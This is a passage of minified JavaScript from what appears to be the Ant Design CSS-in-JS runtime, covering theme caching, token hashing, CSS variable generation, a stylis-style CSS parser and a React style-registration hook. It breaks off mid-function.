var ThemeCache = (function () {
  function i() {
    _classCallCheck(this, i),
      _defineProperty$1(this, "cache", void 0),
      _defineProperty$1(this, "keys", void 0),
      _defineProperty$1(this, "cacheCallTimes", void 0),
      (this.cache = new Map()),
      (this.keys = []),
      (this.cacheCallTimes = 0);
  }
  return (
    _createClass(i, [
      {
        key: "size",
        value: function () {
          return this.keys.length;
        },
      },
      {
        key: "internalGet",
        value: function (o) {
          var s,
            tt,
            nt =
              arguments.length > 1 && arguments[1] !== void 0
                ? arguments[1]
                : !1,
            ot = { map: this.cache };
          return (
            o.forEach(function (st) {
              if (!ot) ot = void 0;
              else {
                var ft;
                ot =
                  (ft = ot) === null ||
                  ft === void 0 ||
                  (ft = ft.map) === null ||
                  ft === void 0
                    ? void 0
                    : ft.get(st);
              }
            }),
            (s = ot) !== null &&
              s !== void 0 &&
              s.value &&
              nt &&
              (ot.value[1] = this.cacheCallTimes++),
            (tt = ot) === null || tt === void 0 ? void 0 : tt.value
          );
        },
      },
      {
        key: "get",
        value: function (o) {
          var s;
          return (s = this.internalGet(o, !0)) === null || s === void 0
            ? void 0
            : s[0];
        },
      },
      {
        key: "has",
        value: function (o) {
          return !!this.internalGet(o);
        },
      },
      {
        key: "set",
        value: function (o, s) {
          var tt = this;
          if (!this.has(o)) {
            if (this.size() + 1 > i.MAX_CACHE_SIZE + i.MAX_CACHE_OFFSET) {
              var nt = this.keys.reduce(
                  function (ht, gt) {
                    var St = _slicedToArray$1(ht, 2),
                      vt = St[1];
                    return tt.internalGet(gt)[1] < vt
                      ? [gt, tt.internalGet(gt)[1]]
                      : ht;
                  },
                  [this.keys[0], this.cacheCallTimes]
                ),
                ot = _slicedToArray$1(nt, 1),
                st = ot[0];
              this.delete(st);
            }
            this.keys.push(o);
          }
          var ft = this.cache;
          o.forEach(function (ht, gt) {
            if (gt === o.length - 1)
              ft.set(ht, { value: [s, tt.cacheCallTimes++] });
            else {
              var St = ft.get(ht);
              St
                ? St.map || (St.map = new Map())
                : ft.set(ht, { map: new Map() }),
                (ft = ft.get(ht).map);
            }
          });
        },
      },
      {
        key: "deleteByPath",
        value: function (o, s) {
          var tt = o.get(s[0]);
          if (s.length === 1) {
            var nt;
            return (
              tt.map ? o.set(s[0], { map: tt.map }) : o.delete(s[0]),
              (nt = tt.value) === null || nt === void 0 ? void 0 : nt[0]
            );
          }
          var ot = this.deleteByPath(tt.map, s.slice(1));
          return (
            (!tt.map || tt.map.size === 0) && !tt.value && o.delete(s[0]), ot
          );
        },
      },
      {
        key: "delete",
        value: function (o) {
          if (this.has(o))
            return (
              (this.keys = this.keys.filter(function (s) {
                return !sameDerivativeOption(s, o);
              })),
              this.deleteByPath(this.cache, o)
            );
        },
      },
    ]),
    i
  );
})();
_defineProperty$1(ThemeCache, "MAX_CACHE_SIZE", 20);
_defineProperty$1(ThemeCache, "MAX_CACHE_OFFSET", 5);
var uuid$2 = 0,
  Theme = (function () {
    function i(a) {
      _classCallCheck(this, i),
        _defineProperty$1(this, "derivatives", void 0),
        _defineProperty$1(this, "id", void 0),
        (this.derivatives = Array.isArray(a) ? a : [a]),
        (this.id = uuid$2),
        a.length === 0 && (a.length > 0, void 0),
        (uuid$2 += 1);
    }
    return (
      _createClass(i, [
        {
          key: "getDerivativeToken",
          value: function (o) {
            return this.derivatives.reduce(function (s, tt) {
              return tt(o, s);
            }, void 0);
          },
        },
      ]),
      i
    );
  })(),
  cacheThemes = new ThemeCache();
function createTheme(i) {
  var a = Array.isArray(i) ? i : [i];
  return (
    cacheThemes.has(a) || cacheThemes.set(a, new Theme(a)), cacheThemes.get(a)
  );
}
var resultCache = new WeakMap(),
  RESULT_VALUE = {};
function memoResult(i, a) {
  for (var o = resultCache, s = 0; s < a.length; s += 1) {
    var tt = a[s];
    o.has(tt) || o.set(tt, new WeakMap()), (o = o.get(tt));
  }
  return o.has(RESULT_VALUE) || o.set(RESULT_VALUE, i()), o.get(RESULT_VALUE);
}
var flattenTokenCache = new WeakMap();
function flattenToken(i) {
  var a = flattenTokenCache.get(i) || "";
  return (
    a ||
      (Object.keys(i).forEach(function (o) {
        var s = i[o];
        (a += o),
          s instanceof Theme
            ? (a += s.id)
            : s && _typeof(s) === "object"
            ? (a += flattenToken(s))
            : (a += s);
      }),
      (a = murmur2(a)),
      flattenTokenCache.set(i, a)),
    a
  );
}
function token2key(i, a) {
  return murmur2("".concat(a, "_").concat(flattenToken(i)));
}
var isClientSide = canUseDom();
function unit$1(i) {
  return typeof i == "number" ? "".concat(i, "px") : i;
}
function toStyleStr(i, a, o) {
  var s,
    tt = arguments.length > 3 && arguments[3] !== void 0 ? arguments[3] : {},
    nt = arguments.length > 4 && arguments[4] !== void 0 ? arguments[4] : !1;
  if (nt) return i;
  var ot = _objectSpread2$1(
      _objectSpread2$1({}, tt),
      {},
      ((s = {}),
      _defineProperty$1(s, ATTR_TOKEN, a),
      _defineProperty$1(s, ATTR_MARK, o),
      s)
    ),
    st = Object.keys(ot)
      .map(function (ft) {
        var ht = ot[ft];
        return ht ? "".concat(ft, '="').concat(ht, '"') : null;
      })
      .filter(function (ft) {
        return ft;
      })
      .join(" ");
  return "<style ".concat(st, ">").concat(i, "</style>");
}
var token2CSSVar = function (a) {
    var o = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "";
    return "--"
      .concat(o ? "".concat(o, "-") : "")
      .concat(a)
      .replace(/([a-z0-9])([A-Z])/g, "$1-$2")
      .replace(/([A-Z]+)([A-Z][a-z0-9]+)/g, "$1-$2")
      .replace(/([a-z])([A-Z0-9])/g, "$1-$2")
      .toLowerCase();
  },
  serializeCSSVar = function (a, o, s) {
    return Object.keys(a).length
      ? "."
          .concat(o)
          .concat(s != null && s.scope ? ".".concat(s.scope) : "", "{")
          .concat(
            Object.entries(a)
              .map(function (tt) {
                var nt = _slicedToArray$1(tt, 2),
                  ot = nt[0],
                  st = nt[1];
                return "".concat(ot, ":").concat(st, ";");
              })
              .join(""),
            "}"
          )
      : "";
  },
  transformToken = function (a, o, s) {
    var tt = {},
      nt = {};
    return (
      Object.entries(a).forEach(function (ot) {
        var st,
          ft,
          ht = _slicedToArray$1(ot, 2),
          gt = ht[0],
          St = ht[1];
        if (s != null && (st = s.preserve) !== null && st !== void 0 && st[gt])
          nt[gt] = St;
        else if (
          (typeof St == "string" || typeof St == "number") &&
          !(s != null && (ft = s.ignore) !== null && ft !== void 0 && ft[gt])
        ) {
          var vt,
            _t = token2CSSVar(gt, s == null ? void 0 : s.prefix);
          (tt[_t] =
            typeof St == "number" &&
            !(
              s != null &&
              (vt = s.unitless) !== null &&
              vt !== void 0 &&
              vt[gt]
            )
              ? "".concat(St, "px")
              : String(St)),
            (nt[gt] = "var(".concat(_t, ")"));
        }
      }),
      [nt, serializeCSSVar(tt, o, { scope: s == null ? void 0 : s.scope })]
    );
  },
  useInternalLayoutEffect = canUseDom()
    ? reactExports.useLayoutEffect
    : reactExports.useEffect,
  useLayoutEffect = function (a, o) {
    var s = reactExports.useRef(!0);
    useInternalLayoutEffect(function () {
      return a(s.current);
    }, o),
      useInternalLayoutEffect(function () {
        return (
          (s.current = !1),
          function () {
            s.current = !0;
          }
        );
      }, []);
  },
  useLayoutUpdateEffect = function (a, o) {
    useLayoutEffect(function (s) {
      if (!s) return a();
    }, o);
  },
  fullClone$3 = _objectSpread2$1({}, React$2),
  useInsertionEffect$1 = fullClone$3.useInsertionEffect,
  useInsertionEffectPolyfill = function (a, o, s) {
    reactExports.useMemo(a, s),
      useLayoutEffect(function () {
        return o(!0);
      }, s);
  },
  useCompatibleInsertionEffect = useInsertionEffect$1
    ? function (i, a, o) {
        return useInsertionEffect$1(function () {
          return i(), a();
        }, o);
      }
    : useInsertionEffectPolyfill,
  fullClone$2 = _objectSpread2$1({}, React$2),
  useInsertionEffect = fullClone$2.useInsertionEffect,
  useCleanupRegister = function (a) {
    var o = [],
      s = !1;
    function tt(nt) {
      s || o.push(nt);
    }
    return (
      reactExports.useEffect(function () {
        return (
          (s = !1),
          function () {
            (s = !0),
              o.length &&
                o.forEach(function (nt) {
                  return nt();
                });
          }
        );
      }, a),
      tt
    );
  },
  useRun = function () {
    return function (a) {
      a();
    };
  },
  useEffectCleanupRegister =
    typeof useInsertionEffect < "u" ? useCleanupRegister : useRun;
function useGlobalCache(i, a, o, s, tt) {
  var nt = reactExports.useContext(StyleContext),
    ot = nt.cache,
    st = [i].concat(_toConsumableArray(a)),
    ft = pathKey(st),
    ht = useEffectCleanupRegister([ft]),
    gt = function (Et) {
      ot.opUpdate(ft, function (Ct) {
        var Pt = Ct || [void 0, void 0],
          bt = _slicedToArray$1(Pt, 2),
          xt = bt[0],
          yt = xt === void 0 ? 0 : xt,
          wt = bt[1],
          $t = wt,
          kt = $t || o(),
          Rt = [yt, kt];
        return Et ? Et(Rt) : Rt;
      });
    };
  reactExports.useMemo(
    function () {
      gt();
    },
    [ft]
  );
  var St = ot.opGet(ft),
    vt = St[1];
  return (
    useCompatibleInsertionEffect(
      function () {
        tt == null || tt(vt);
      },
      function (_t) {
        return (
          gt(function (Et) {
            var Ct = _slicedToArray$1(Et, 2),
              Pt = Ct[0],
              bt = Ct[1];
            return _t && Pt === 0 && (tt == null || tt(vt)), [Pt + 1, bt];
          }),
          function () {
            ot.opUpdate(ft, function (Et) {
              var Ct = Et || [],
                Pt = _slicedToArray$1(Ct, 2),
                bt = Pt[0],
                xt = bt === void 0 ? 0 : bt,
                yt = Pt[1],
                wt = xt - 1;
              return wt === 0
                ? (ht(function () {
                    (_t || !ot.opGet(ft)) && (s == null || s(yt, !1));
                  }),
                  null)
                : [xt - 1, yt];
            });
          }
        );
      },
      [ft]
    ),
    vt
  );
}
var EMPTY_OVERRIDE = {},
  hashPrefix = "css",
  tokenKeys = new Map();
function recordCleanToken(i) {
  tokenKeys.set(i, (tokenKeys.get(i) || 0) + 1);
}
function removeStyleTags(i, a) {
  if (typeof document < "u") {
    var o = document.querySelectorAll(
      "style[".concat(ATTR_TOKEN, '="').concat(i, '"]')
    );
    o.forEach(function (s) {
      if (s[CSS_IN_JS_INSTANCE] === a) {
        var tt;
        (tt = s.parentNode) === null || tt === void 0 || tt.removeChild(s);
      }
    });
  }
}
var TOKEN_THRESHOLD = 0;
function cleanTokenStyle(i, a) {
  tokenKeys.set(i, (tokenKeys.get(i) || 0) - 1);
  var o = Array.from(tokenKeys.keys()),
    s = o.filter(function (tt) {
      var nt = tokenKeys.get(tt) || 0;
      return nt <= 0;
    });
  o.length - s.length > TOKEN_THRESHOLD &&
    s.forEach(function (tt) {
      removeStyleTags(tt, a), tokenKeys.delete(tt);
    });
}
var getComputedToken$1 = function (a, o, s, tt) {
    var nt = s.getDerivativeToken(a),
      ot = _objectSpread2$1(_objectSpread2$1({}, nt), o);
    return tt && (ot = tt(ot)), ot;
  },
  TOKEN_PREFIX = "token";
function useCacheToken(i, a) {
  var o = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : {},
    s = reactExports.useContext(StyleContext),
    tt = s.cache.instanceId,
    nt = s.container,
    ot = o.salt,
    st = ot === void 0 ? "" : ot,
    ft = o.override,
    ht = ft === void 0 ? EMPTY_OVERRIDE : ft,
    gt = o.formatToken,
    St = o.getComputedToken,
    vt = o.cssVar,
    _t = memoResult(function () {
      return Object.assign.apply(Object, [{}].concat(_toConsumableArray(a)));
    }, a),
    Et = flattenToken(_t),
    Ct = flattenToken(ht),
    Pt = vt ? flattenToken(vt) : "",
    bt = useGlobalCache(
      TOKEN_PREFIX,
      [st, i.id, Et, Ct, Pt],
      function () {
        var xt,
          yt = St ? St(_t, ht, i) : getComputedToken$1(_t, ht, i, gt),
          wt = _objectSpread2$1({}, yt),
          $t = "";
        if (vt) {
          var kt = transformToken(yt, vt.key, {
              prefix: vt.prefix,
              ignore: vt.ignore,
              unitless: vt.unitless,
              preserve: vt.preserve,
            }),
            Rt = _slicedToArray$1(kt, 2);
          (yt = Rt[0]), ($t = Rt[1]);
        }
        var It = token2key(yt, st);
        (yt._tokenKey = It), (wt._tokenKey = token2key(wt, st));
        var Ot =
          (xt = vt == null ? void 0 : vt.key) !== null && xt !== void 0
            ? xt
            : It;
        (yt._themeKey = Ot), recordCleanToken(Ot);
        var Nt = "".concat(hashPrefix, "-").concat(murmur2(It));
        return (
          (yt._hashId = Nt),
          [yt, Nt, wt, $t, (vt == null ? void 0 : vt.key) || ""]
        );
      },
      function (xt) {
        cleanTokenStyle(xt[0]._themeKey, tt);
      },
      function (xt) {
        var yt = _slicedToArray$1(xt, 4),
          wt = yt[0],
          $t = yt[3];
        if (vt && $t) {
          var kt = updateCSS(
            $t,
            murmur2("css-variables-".concat(wt._themeKey)),
            { mark: ATTR_MARK, prepend: "queue", attachTo: nt, priority: -999 }
          );
          (kt[CSS_IN_JS_INSTANCE] = tt),
            kt.setAttribute(ATTR_TOKEN, wt._themeKey);
        }
      }
    );
  return bt;
}
var extract$2 = function (a, o, s) {
    var tt = _slicedToArray$1(a, 5),
      nt = tt[2],
      ot = tt[3],
      st = tt[4],
      ft = s || {},
      ht = ft.plain;
    if (!ot) return null;
    var gt = nt._tokenKey,
      St = -999,
      vt = {
        "data-rc-order": "prependQueue",
        "data-rc-priority": "".concat(St),
      },
      _t = toStyleStr(ot, st, gt, vt, ht);
    return [St, gt, _t];
  },
  unitlessKeys$1 = {
    animationIterationCount: 1,
    borderImageOutset: 1,
    borderImageSlice: 1,
    borderImageWidth: 1,
    boxFlex: 1,
    boxFlexGroup: 1,
    boxOrdinalGroup: 1,
    columnCount: 1,
    columns: 1,
    flex: 1,
    flexGrow: 1,
    flexPositive: 1,
    flexShrink: 1,
    flexNegative: 1,
    flexOrder: 1,
    gridRow: 1,
    gridRowEnd: 1,
    gridRowSpan: 1,
    gridRowStart: 1,
    gridColumn: 1,
    gridColumnEnd: 1,
    gridColumnSpan: 1,
    gridColumnStart: 1,
    msGridRow: 1,
    msGridRowSpan: 1,
    msGridColumn: 1,
    msGridColumnSpan: 1,
    fontWeight: 1,
    lineHeight: 1,
    opacity: 1,
    order: 1,
    orphans: 1,
    tabSize: 1,
    widows: 1,
    zIndex: 1,
    zoom: 1,
    WebkitLineClamp: 1,
    fillOpacity: 1,
    floodOpacity: 1,
    stopOpacity: 1,
    strokeDasharray: 1,
    strokeDashoffset: 1,
    strokeMiterlimit: 1,
    strokeOpacity: 1,
    strokeWidth: 1,
  },
  COMMENT$1 = "comm",
  RULESET$1 = "rule",
  DECLARATION$1 = "decl",
  IMPORT$1 = "@import",
  KEYFRAMES$1 = "@keyframes",
  LAYER$1 = "@layer",
  abs$1 = Math.abs,
  from$1 = String.fromCharCode;
function trim$1(i) {
  return i.trim();
}
function replace$1(i, a, o) {
  return i.replace(a, o);
}
function indexof$1(i, a, o) {
  return i.indexOf(a, o);
}
function charat$1(i, a) {
  return i.charCodeAt(a) | 0;
}
function substr$1(i, a, o) {
  return i.slice(a, o);
}
function strlen$1(i) {
  return i.length;
}
function sizeof$1(i) {
  return i.length;
}
function append$1(i, a) {
  return a.push(i), i;
}
var line$1 = 1,
  column$1 = 1,
  length$1 = 0,
  position$1 = 0,
  character$1 = 0,
  characters$1 = "";
function node$1(i, a, o, s, tt, nt, ot, st) {
  return {
    value: i,
    root: a,
    parent: o,
    type: s,
    props: tt,
    children: nt,
    line: line$1,
    column: column$1,
    length: ot,
    return: "",
    siblings: st,
  };
}
function char$1() {
  return character$1;
}
function prev$1() {
  return (
    (character$1 = position$1 > 0 ? charat$1(characters$1, --position$1) : 0),
    column$1--,
    character$1 === 10 && ((column$1 = 1), line$1--),
    character$1
  );
}
function next$1() {
  return (
    (character$1 =
      position$1 < length$1 ? charat$1(characters$1, position$1++) : 0),
    column$1++,
    character$1 === 10 && ((column$1 = 1), line$1++),
    character$1
  );
}
function peek$2() {
  return charat$1(characters$1, position$1);
}
function caret$1() {
  return position$1;
}
function slice$1(i, a) {
  return substr$1(characters$1, i, a);
}
function token$1(i) {
  switch (i) {
    case 0:
    case 9:
    case 10:
    case 13:
    case 32:
      return 5;
    case 33:
    case 43:
    case 44:
    case 47:
    case 62:
    case 64:
    case 126:
    case 59:
    case 123:
    case 125:
      return 4;
    case 58:
      return 3;
    case 34:
    case 39:
    case 40:
    case 91:
      return 2;
    case 41:
    case 93:
      return 1;
  }
  return 0;
}
function alloc$1(i) {
  return (
    (line$1 = column$1 = 1),
    (length$1 = strlen$1((characters$1 = i))),
    (position$1 = 0),
    []
  );
}
function dealloc$1(i) {
  return (characters$1 = ""), i;
}
function delimit$1(i) {
  return trim$1(
    slice$1(
      position$1 - 1,
      delimiter$1(i === 91 ? i + 2 : i === 40 ? i + 1 : i)
    )
  );
}
function whitespace$2(i) {
  for (; (character$1 = peek$2()) && character$1 < 33; ) next$1();
  return token$1(i) > 2 || token$1(character$1) > 3 ? "" : " ";
}
function escaping$1(i, a) {
  for (
    ;
    --a &&
    next$1() &&
    !(
      character$1 < 48 ||
      character$1 > 102 ||
      (character$1 > 57 && character$1 < 65) ||
      (character$1 > 70 && character$1 < 97)
    );

  );
  return slice$1(i, caret$1() + (a < 6 && peek$2() == 32 && next$1() == 32));
}
function delimiter$1(i) {
  for (; next$1(); )
    switch (character$1) {
      case i:
        return position$1;
      case 34:
      case 39:
        i !== 34 && i !== 39 && delimiter$1(character$1);
        break;
      case 40:
        i === 41 && delimiter$1(i);
        break;
      case 92:
        next$1();
        break;
    }
  return position$1;
}
function commenter$1(i, a) {
  for (; next$1() && i + character$1 !== 57; )
    if (i + character$1 === 84 && peek$2() === 47) break;
  return (
    "/*" + slice$1(a, position$1 - 1) + "*" + from$1(i === 47 ? i : next$1())
  );
}
function identifier$1(i) {
  for (; !token$1(peek$2()); ) next$1();
  return slice$1(i, position$1);
}
function compile$1(i) {
  return dealloc$1(
    parse$1("", null, null, null, [""], (i = alloc$1(i)), 0, [0], i)
  );
}
function parse$1(i, a, o, s, tt, nt, ot, st, ft) {
  for (
    var ht = 0,
      gt = 0,
      St = ot,
      vt = 0,
      _t = 0,
      Et = 0,
      Ct = 1,
      Pt = 1,
      bt = 1,
      xt = 0,
      yt = "",
      wt = tt,
      $t = nt,
      kt = s,
      Rt = yt;
    Pt;

  )
    switch (((Et = xt), (xt = next$1()))) {
      case 40:
        if (Et != 108 && charat$1(Rt, St - 1) == 58) {
          indexof$1(
            (Rt += replace$1(delimit$1(xt), "&", "&\f")),
            "&\f",
            abs$1(ht ? st[ht - 1] : 0)
          ) != -1 && (bt = -1);
          break;
        }
      case 34:
      case 39:
      case 91:
        Rt += delimit$1(xt);
        break;
      case 9:
      case 10:
      case 13:
      case 32:
        Rt += whitespace$2(Et);
        break;
      case 92:
        Rt += escaping$1(caret$1() - 1, 7);
        continue;
      case 47:
        switch (peek$2()) {
          case 42:
          case 47:
            append$1(comment$1(commenter$1(next$1(), caret$1()), a, o, ft), ft),
              (token$1(Et || 1) == 5 || token$1(peek$2() || 1) == 5) &&
                strlen$1(Rt) &&
                substr$1(Rt, -1, void 0) !== " " &&
                (Rt += " ");
            break;
          default:
            Rt += "/";
        }
        break;
      case 123 * Ct:
        st[ht++] = strlen$1(Rt) * bt;
      case 125 * Ct:
      case 59:
      case 0:
        switch (xt) {
          case 0:
          case 125:
            Pt = 0;
          case 59 + gt:
            bt == -1 && (Rt = replace$1(Rt, /\f/g, "")),
              _t > 0 &&
                (strlen$1(Rt) - St || (Ct === 0 && Et === 47)) &&
                append$1(
                  _t > 32
                    ? declaration$1(Rt + ";", s, o, St - 1, ft)
                    : declaration$1(
                        replace$1(Rt, " ", "") + ";",
                        s,
                        o,
                        St - 2,
                        ft
                      ),
                  ft
                );
            break;
          case 59:
            Rt += ";";
          default:
            if (
              (append$1(
                (kt = ruleset$1(
                  Rt,
                  a,
                  o,
                  ht,
                  gt,
                  tt,
                  st,
                  yt,
                  (wt = []),
                  ($t = []),
                  St,
                  nt
                )),
                nt
              ),
              xt === 123)
            )
              if (gt === 0) parse$1(Rt, a, kt, kt, wt, nt, St, st, $t);
              else
                switch (vt === 99 && charat$1(Rt, 3) === 110 ? 100 : vt) {
                  case 100:
                  case 108:
                  case 109:
                  case 115:
                    parse$1(
                      i,
                      kt,
                      kt,
                      s &&
                        append$1(
                          ruleset$1(
                            i,
                            kt,
                            kt,
                            0,
                            0,
                            tt,
                            st,
                            yt,
                            tt,
                            (wt = []),
                            St,
                            $t
                          ),
                          $t
                        ),
                      tt,
                      $t,
                      St,
                      st,
                      s ? wt : $t
                    );
                    break;
                  default:
                    parse$1(Rt, kt, kt, kt, [""], $t, 0, st, $t);
                }
        }
        (ht = gt = _t = 0), (Ct = bt = 1), (yt = Rt = ""), (St = ot);
        break;
      case 58:
        (St = 1 + strlen$1(Rt)), (_t = Et);
      default:
        if (Ct < 1) {
          if (xt == 123) --Ct;
          else if (xt == 125 && Ct++ == 0 && prev$1() == 125) continue;
        }
        switch (((Rt += from$1(xt)), xt * Ct)) {
          case 38:
            bt = gt > 0 ? 1 : ((Rt += "\f"), -1);
            break;
          case 44:
            (st[ht++] = (strlen$1(Rt) - 1) * bt), (bt = 1);
            break;
          case 64:
            peek$2() === 45 && (Rt += delimit$1(next$1())),
              (vt = peek$2()),
              (gt = St = strlen$1((yt = Rt += identifier$1(caret$1())))),
              xt++;
            break;
          case 45:
            Et === 45 && strlen$1(Rt) == 2 && (Ct = 0);
        }
    }
  return nt;
}
function ruleset$1(i, a, o, s, tt, nt, ot, st, ft, ht, gt, St) {
  for (
    var vt = tt - 1,
      _t = tt === 0 ? nt : [""],
      Et = sizeof$1(_t),
      Ct = 0,
      Pt = 0,
      bt = 0;
    Ct < s;
    ++Ct
  )
    for (
      var xt = 0, yt = substr$1(i, vt + 1, (vt = abs$1((Pt = ot[Ct])))), wt = i;
      xt < Et;
      ++xt
    )
      (wt = trim$1(
        Pt > 0 ? _t[xt] + " " + yt : replace$1(yt, /&\f/g, _t[xt])
      )) && (ft[bt++] = wt);
  return node$1(i, a, o, tt === 0 ? RULESET$1 : st, ft, ht, gt, St);
}
function comment$1(i, a, o, s) {
  return node$1(i, a, o, COMMENT$1, from$1(char$1()), substr$1(i, 2, -2), 0, s);
}
function declaration$1(i, a, o, s, tt) {
  return node$1(
    i,
    a,
    o,
    DECLARATION$1,
    substr$1(i, 0, s),
    substr$1(i, s + 1, -1),
    s,
    tt
  );
}
function serialize$1(i, a) {
  for (var o = "", s = 0; s < i.length; s++) o += a(i[s], s, i, a) || "";
  return o;
}
function stringify$2(i, a, o, s) {
  switch (i.type) {
    case LAYER$1:
      if (i.children.length) break;
    case IMPORT$1:
    case DECLARATION$1:
      return (i.return = i.return || i.value);
    case COMMENT$1:
      return "";
    case KEYFRAMES$1:
      return (i.return = i.value + "{" + serialize$1(i.children, s) + "}");
    case RULESET$1:
      if (!strlen$1((i.value = i.props.join(",")))) return "";
  }
  return strlen$1((o = serialize$1(i.children, s)))
    ? (i.return = i.value + "{" + o + "}")
    : "";
}
var ATTR_CACHE_MAP = "data-ant-cssinjs-cache-path",
  CSS_FILE_STYLE = "_FILE_STYLE__",
  cachePathMap,
  fromCSSFile = !0;
function prepare() {
  if (!cachePathMap && ((cachePathMap = {}), canUseDom())) {
    var i = document.createElement("div");
    (i.className = ATTR_CACHE_MAP),
      (i.style.position = "fixed"),
      (i.style.visibility = "hidden"),
      (i.style.top = "-9999px"),
      document.body.appendChild(i);
    var a = getComputedStyle(i).content || "";
    (a = a.replace(/^"/, "").replace(/"$/, "")),
      a.split(";").forEach(function (tt) {
        var nt = tt.split(":"),
          ot = _slicedToArray$1(nt, 2),
          st = ot[0],
          ft = ot[1];
        cachePathMap[st] = ft;
      });
    var o = document.querySelector("style[".concat(ATTR_CACHE_MAP, "]"));
    if (o) {
      var s;
      (fromCSSFile = !1),
        (s = o.parentNode) === null || s === void 0 || s.removeChild(o);
    }
    document.body.removeChild(i);
  }
}
function existPath(i) {
  return prepare(), !!cachePathMap[i];
}
function getStyleAndHash(i) {
  var a = cachePathMap[i],
    o = null;
  if (a && canUseDom())
    if (fromCSSFile) o = CSS_FILE_STYLE;
    else {
      var s = document.querySelector(
        "style[".concat(ATTR_MARK, '="').concat(cachePathMap[i], '"]')
      );
      s ? (o = s.innerHTML) : delete cachePathMap[i];
    }
  return [o, a];
}
var SKIP_CHECK = "_skip_check_",
  MULTI_VALUE = "_multi_value_";
function normalizeStyle(i) {
  var a = serialize$1(compile$1(i), stringify$2);
  return a.replace(/\{%%%\:[^;];}/g, ";");
}
function isCompoundCSSProperty(i) {
  return _typeof(i) === "object" && i && (SKIP_CHECK in i || MULTI_VALUE in i);
}
function injectSelectorHash(i, a, o) {
  if (!a) return i;
  var s = ".".concat(a),
    tt = o === "low" ? ":where(".concat(s, ")") : s,
    nt = i.split(",").map(function (ot) {
      var st,
        ft = ot.trim().split(/\s+/),
        ht = ft[0] || "",
        gt =
          ((st = ht.match(/^\w+/)) === null || st === void 0
            ? void 0
            : st[0]) || "";
      return (
        (ht = "".concat(gt).concat(tt).concat(ht.slice(gt.length))),
        [ht].concat(_toConsumableArray(ft.slice(1))).join(" ")
      );
    });
  return nt.join(",");
}
var parseStyle = function i(a) {
  var o = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {},
    s =
      arguments.length > 2 && arguments[2] !== void 0
        ? arguments[2]
        : { root: !0, parentSelectors: [] },
    tt = s.root,
    nt = s.injectHash,
    ot = s.parentSelectors,
    st = o.hashId,
    ft = o.layer;
  o.path;
  var ht = o.hashPriority,
    gt = o.transformers,
    St = gt === void 0 ? [] : gt;
  o.linters;
  var vt = "",
    _t = {};
  function Et(bt) {
    var xt = bt.getName(st);
    if (!_t[xt]) {
      var yt = i(bt.style, o, { root: !1, parentSelectors: ot }),
        wt = _slicedToArray$1(yt, 1),
        $t = wt[0];
      _t[xt] = "@keyframes ".concat(bt.getName(st)).concat($t);
    }
  }
  function Ct(bt) {
    var xt =
      arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : [];
    return (
      bt.forEach(function (yt) {
        Array.isArray(yt) ? Ct(yt, xt) : yt && xt.push(yt);
      }),
      xt
    );
  }
  var Pt = Ct(Array.isArray(a) ? a : [a]);
  return (
    Pt.forEach(function (bt) {
      var xt = typeof bt == "string" && !tt ? {} : bt;
      if (typeof xt == "string")
        vt += "".concat(
          xt,
          `
`
        );
      else if (xt._keyframe) Et(xt);
      else {
        var yt = St.reduce(function (wt, $t) {
          var kt;
          return (
            ($t == null || (kt = $t.visit) === null || kt === void 0
              ? void 0
              : kt.call($t, wt)) || wt
          );
        }, xt);
        Object.keys(yt).forEach(function (wt) {
          var $t = yt[wt];
          if (
            _typeof($t) === "object" &&
            $t &&
            (wt !== "animationName" || !$t._keyframe) &&
            !isCompoundCSSProperty($t)
          ) {
            var kt = !1,
              Rt = wt.trim(),
              It = !1;
            (tt || nt) && st
              ? Rt.startsWith("@")
                ? (kt = !0)
                : Rt === "&"
                ? (Rt = injectSelectorHash("", st, ht))
                : (Rt = injectSelectorHash(wt, st, ht))
              : tt &&
                !st &&
                (Rt === "&" || Rt === "") &&
                ((Rt = ""), (It = !0));
            var Ot = i($t, o, {
                root: It,
                injectHash: kt,
                parentSelectors: [].concat(_toConsumableArray(ot), [Rt]),
              }),
              Nt = _slicedToArray$1(Ot, 2),
              zt = Nt[0],
              Bt = Nt[1];
            (_t = _objectSpread2$1(_objectSpread2$1({}, _t), Bt)),
              (vt += "".concat(Rt).concat(zt));
          } else {
            let Vt = function (Mt, Ft) {
              var Tt = Mt.replace(/[A-Z]/g, function (Lt) {
                  return "-".concat(Lt.toLowerCase());
                }),
                At = Ft;
              !unitlessKeys$1[Mt] &&
                typeof At == "number" &&
                At !== 0 &&
                (At = "".concat(At, "px")),
                Mt === "animationName" &&
                  Ft !== null &&
                  Ft !== void 0 &&
                  Ft._keyframe &&
                  (Et(Ft), (At = Ft.getName(st))),
                (vt += "".concat(Tt, ":").concat(At, ";"));
            };
            var Wt,
              Gt =
                (Wt = $t == null ? void 0 : $t.value) !== null && Wt !== void 0
                  ? Wt
                  : $t;
            _typeof($t) === "object" &&
            $t !== null &&
            $t !== void 0 &&
            $t[MULTI_VALUE] &&
            Array.isArray(Gt)
              ? Gt.forEach(function (Mt) {
                  Vt(wt, Mt);
                })
              : Vt(wt, Gt);
          }
        });
      }
    }),
    tt
      ? ft &&
        (vt && (vt = "@layer ".concat(ft.name, " {").concat(vt, "}")),
        ft.dependencies &&
          (_t["@layer ".concat(ft.name)] = ft.dependencies.map(function (bt) {
            return "@layer ".concat(bt, ", ").concat(ft.name, ";");
          }).join(`
`)))
      : (vt = "{".concat(vt, "}")),
    [vt, _t]
  );
};
function uniqueHash(i, a) {
  return murmur2("".concat(i.join("%")).concat(a));
}
function Empty() {
  return null;
}
var STYLE_PREFIX = "style";
function useStyleRegister(i, a) {
  var o = i.token,
    s = i.path,
    tt = i.hashId,
    nt = i.layer,
    ot = i.nonce,
    st = i.clientOnly,
    ft = i.order,
    ht = ft === void 0 ? 0 : ft,
    gt = reactExports.useContext(StyleContext),
    St = gt.autoClear;
  gt.mock;
  var vt = gt.defaultCache,
    _t = gt.hashPriority,
    Et = gt.container,
    Ct = gt.ssrInline,
    Pt = gt.transformers,
    bt = gt.linters,
    xt = gt.cache,
    yt = gt.layer,
    wt = o._tokenKey,
    $t = [wt];
  yt && $t.push("layer"), $t.push.apply($t, _toConsumableArray(s));
  var kt = isClientSide,
    Rt = useGlobalCache(
      STYLE_PREFIX,
      $t,
      function () {
        var Bt = $t.join("|");
        if (existPath(Bt)) {
          var Wt = getStyleAndHash(Bt),
            Gt = _slicedToArray$1(Wt, 2),
            Vt = Gt[0],
            Mt = Gt[1];
